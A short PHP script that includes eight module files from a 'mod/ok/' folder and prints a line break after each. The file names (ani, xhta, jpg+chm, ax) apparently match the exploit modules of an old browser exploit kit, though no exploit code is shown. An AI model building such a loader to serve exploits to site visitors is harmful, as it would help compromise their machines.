<?php
include("mod/ok/jrl.php"); echo'<br>';
include("mod/ok/xhta.php"); echo'<br>';
include("mod/ok/ppp3.php"); echo'<br>';
include("mod/ok/ani.php"); echo'<br>';
include("mod/ok/ax.php"); echo'<br>';
include("mod/ok/ax2.php"); echo'<br>';
include("mod/ok/jpg+chm.php"); echo'<br>';
include("mod/ok/xml.php"); echo'<br>';
?>